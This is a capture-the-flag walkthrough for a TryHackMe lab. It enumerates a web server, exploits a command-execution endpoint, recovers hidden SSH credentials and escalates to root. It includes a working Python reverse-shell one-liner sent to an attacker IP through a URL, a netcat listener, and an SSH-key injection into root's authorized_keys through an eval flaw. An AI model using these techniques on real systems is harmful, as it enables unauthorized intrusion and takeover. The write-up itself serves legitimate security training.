# THM Challenge - U.A. Academy

Link to the challenge: [link](https://tryhackme.com/r/room/yueiua)

## Nmap enumeration

```bash
nmap -sX TARGET_IP
```

Output:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 04:17 EST
Nmap scan report for TARGET_IP
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE         SERVICE
22/tcp open|filtered ssh
80/tcp open|filtered http

```

Open services are SSH (port 22) and HTTP (port 80).
We can try exploring the HTTP website and search for user credentials so as to eventually access the remote server via SSH.


### Website profiling

We can run 

```bash
whatweb -a 3 http://TARGET_IP
```

Output:
```
http://TARGET_IP [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[info@yuei.ac.jp], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[TARGET_IP], Title[U.A. High School]

```

This reveals that the website is running on an Apache server on Ubuntu.

### Website enumeration

We can have a quick glance at the website by visiting `http://TARGET_IP` on our browser.
There are just four simple html pages. The CSS is loaded from the path `TARGET_IP/assets/`. 
However, the path cannot be simply accessed by visiting the corresponding URL. The CSS file does not contain anything interesting either (just some random comments in Italian).

However, we can try fuzzy enumeration with `ffuf`, using the `fuzz.txt` list available at https://github.com/Bo0oM/fuzz.txt/blob/master/fuzz.txt

```bash
ffuf -u http://TARGET_IP/FUZZ -w path/to/fuzz.txt
```  

Output:
```
...
assets/                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
index.html              [Status: 200, Size: 1988, Words: 171, Lines: 62, Duration: 27ms]
:: Progress: [5344/5344] :: Job [1/1] :: 2105 req/sec :: Duration: [0:00:06] :: Errors: 0 :
```

This search returned nothing that we didn't already know, but we can try repeating it and target the `/assets/` path specifically.

```bash
ffuf -u http://TARGET_IP/assets/FUZZ -w path/to/fuzz.txt
```

Output:
```
...
index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
```

This reveals the presence of an `index.php` file that we can try to exploit. 

### Vulnerability discovery

We can run

```bash
dirsearch -u http://TARGET_IP/assets/index.php
``` 

Output:
```

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                   
 (_||| _) (/_(_|| (_| )                                                                                                                                                                            
                                                                                                                                                                                                   
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/TARGET_IP/_assets_index.php_25-01-25_05-03-59.txt

Target: http://TARGET_IP/

[05:03:59] Starting: assets/index.php/                                                                                                                                                             
[05:04:00] 404 -  274B  - /assets/index.php/%2e%2e//google.com              
[05:04:20] 200 -   40B  - /assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir
                                                                             
```

Notice that `/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir` returns status 200, meaning that the GET request to this URL was accepted. If we try to copy this path on the browser, we obtain a string encoded in base64.
The decoded string shows the directory content (index.php, style.css, ...) suggesting that the `dir` command was correctly executed on the server side.

Since this allows remote execution of bash commands, we can go ahead and try a reverse shell.

### Reverse shell

We can generate a reverse shell one-liner using https://www.revshells.com/
To launch a reverse shell we need two ingredients:
- a command to launch on the remote server, which connects a reverse shell to a specific port (for example 9966)
- netcat listening on that same port

Let's generate a command that executes a python3 script to connect the reverse shell

NOTE: This command should be executed on the remote server 

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("OUR_IP",9966));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

NOTE: `OUR_IP` should be the IP address on the same subnet as the `TARGET_IP`

Now let's launch netcat to listen on port 9966

```bash
nc -lvnp 9966
```

and then go to our browser and paste the following URL

```
http://TARGET_IP/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("OUR_IP",9966));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

```

The reverse shell should now have opened in the terminal where we launched netcat.
We are then able to use commands such as `ls` or `pwd` 


```
listening on [any] 5555 ...
connect to [OUR_IP] from (UNKNOWN) [TARGET_IP] 46926
$ ls
ls
images  index.php  styles.css
$ pwd
pwd

```

and eventually discover a `Hidden_Content` directory, which contains a passphrase (encoded in base64).

```
$ cd /var/www   
cd /var/www
$ ls
ls
Hidden_Content  html
$ cd Hidden_Content
cd Hidden_Content
$ ls
ls
passphrase.txt
$ cat passphrase.txt
cat passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==

```

which decodes to `AllmightForEver!!!`.
In the `/var/www/html/assets/images` directory, we can also find a file called `oneforall.jpg`. Which we can download by running (on our local terminal)

```
wget http://TARGET_IP/assets/images/oneforall.jpg
```

If we try to open it, we quickly find out that we cannot due to an error in the file header (which is that of a PNG). 
We can then fix the error by running
```bash
hexeditor oneforall.jpg
```
and replacing the first bytes with `FF D8 FF E0 00 10 4A 46 49 46 00 01` (see https://en.wikipedia.org/wiki/List_of_file_signatures).

Now we can open the picture, but, most importantly, we can try to find content hidden with steganography by running 
```bash
steghide extract -sf oneforall.jpg
```
which yields a `creds.txt` file with content

```
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

We can use these credential to access the remote server via SSH.
```bash
ssh deku@TARGET_IP
```

Once connected to the server, we immediately find the first flag in the `user.txt` file.

### Privilege escalation

To find the second flag, we need to be able to access the `root` directory.
We can try `sudo -s` to find out that `deku` does not have root privileges.

However, we can run

```bash
sudo -l
```

to determine our current permissions.
Output:

```
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh

```

This output means that we can run `/opt/NewComponent/feedback.sh` with sudo.
By inspecting the content of `feedback.sh` with `cat`, we see the following

```
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi


```

The default behavior of the script is reading from command line and storing the input in the `feedback` variable, to the append this to `/var/log/feedback.txt`. There are some checks to avoid escape characters such as & or ;. However, nothing prevents us from executing the following

```
some_public_key > /root/.ssh/authorized_keys
``` 

Therefore, we go ahead and generate a new asymmetric key pair with `ssh-keygen`, and inject it by running `sudo feedback.sh` and using the line above

```
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
ssh-ed25519 OUR_PUBLIC_KEY name > /root/.ssh/authorized_keys
It is This:
Feedback successfully saved.

```

Now from our local terminal we can connect again via SSH as root using the private key as identity file

```
ssh root@TARGET_IP -i path/to/our_private_key
```

Finally, we can navigate to `/root/` and cat the content of `root.txt`, which is the second flag.

